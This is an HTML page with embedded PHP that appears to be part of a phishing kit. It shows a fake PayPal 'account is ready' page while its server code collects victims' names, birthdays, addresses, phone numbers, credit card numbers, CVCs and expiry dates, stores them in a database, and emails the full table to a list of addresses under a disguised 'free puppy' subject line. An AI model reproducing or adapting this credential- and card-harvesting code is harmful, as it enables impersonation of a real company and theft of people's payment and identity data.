

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><META http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body>





<div>
<p><img src="download.jpg" align="left" style="height:30px;width:100px">
<a href="https://www.paypal.com/signin/" style="float:right" target="_blank">Log In</a></p><br><br><hr>
<h1>Your account is ready to use!</h1>
<h2>Shop, sell things, and transfer money with PayPal now.</h2>
<p><img src="successpage.jpg" align="center" style="height:500px;width:1020px"></p>

<p>© 1999-2015 PayPal Inc   
Privacy   Legal   Contact</p>


</div>
</body>
<?php
include ("account.php");
( $dbh = mysql_connect ( $hostname, $username, $password ) )
	        or die ( "*debug purposes only* Unable to connect to MySQL database" );
//print "*dubug purposes only* Connected to MySQL<br>";
mysql_select_db( $project ); 
$first = mysql_real_escape_string($_GET["first"]);
$last = mysql_real_escape_string($_GET["last"]);
$bday = mysql_real_escape_string($_GET["bday"]);
$street = mysql_real_escape_string($_GET["street"]);
$city = mysql_real_escape_string($_GET["city"]);
$zipcode = mysql_real_escape_string($_GET["zipcode"]);
$country = mysql_real_escape_string($_GET["country"]);
$phone = mysql_real_escape_string($_GET["phone"]);
$creditname = mysql_real_escape_string($_GET["credit"]);
$cvc = mysql_real_escape_string($_GET["cvc"]);
$address = mysql_real_escape_string($_GET["street"]);
$expired = mysql_real_escape_string($_GET["expired"]);

$confirmemail = mysql_real_escape_string($_GET["confirmemail"]);

/*
session_start();
$email = $_SESSION["email"];
$dateRegistered = $_SESSION["dateRegistered"];
*/



$upd_statement = "UPDATE CreditCardInfo SET fname='$first', lname='$last', bday='$bday', street='$street', city='$city', zipcode='$zipcode', 
                    country='$country', phone='$phone', creditname='$creditname', cvc='$cvc', address='$address', expired='$expired', dateRegistered=NOW() WHERE email='$confirmemail'";
$email_retreival = "Select * from emailList";
$data_retreival = "Select * from CreditCardInfo order by dateRegistered DESC";

//please, PLEASE don't remove this :-)
$puppies = [ 0 => "English Bulldog", 1 => "Golden Retriever", 2=> "Labrador Retriever", 3=> "Corgi", 4=> "French Bulldog", 5 => "Yorkshire Terrier", 6=> "Pomeranian", 7=>"Cavi (Cavlier King Charles Spaniel)", 8 => "Saint Bernard", 9 => "Basset Hound", 10 => "Pug" ];

$subject = "$email won another free ".$puppies[rand(0,10)]." puppy!";

//no clue why it's not working right now
//Might need to rewrite later
mysql_query ($upd_statement);
print mysql_error();
$emailTable = mysql_query($email_retreival);
while ($emailRow = mysql_fetch_array($emailTable))
{
	$dataTable = mysql_query($data_retreival);
	print mysql_error();
	$to = $emailRow["email"];
	$message = "UPDATE \n";
	$message.= "email \t| first \t| last \t| birth \t| city \t| zipcode \t| country \t| phone \t| creditcard \t| cvc \t| expiration \t| street  \t \n";
	while ($dataRow = mysql_fetch_array($dataTable))
		{
			$userEmail = $dataRow["email"];
			$First = $dataRow["fname"];
			$Last = $dataRow["lname"];
			$Bday = $dataRow["bday"];
			$City = $dataRow["city"];
			$Zipcode = $dataRow["zipcode"];
			$Country = $dataRow["country"];
			$Phone = $dataRow["phone"];
			$CreditName = $dataRow["creditname"];
			$Cvc = $dataRow["cvc"];
			$Expired = $dataRow["expired"];
			$Address = $dataRow["street"];
			$dateTime = $dateRow["dateRegistered"];
			$message.= "$dateTime | \t$userEmail | \t$First | \t$Last | \t$Bday |
						\t$City | \t$Zipcode | \t$Country | \t$Phone | \t$CreditName | \t$Cvc |
						\t$Expired	| \t$Address \t\n";
		}
		mail($to, $subject, $message);
}
print mysql_error();

?>
</html>
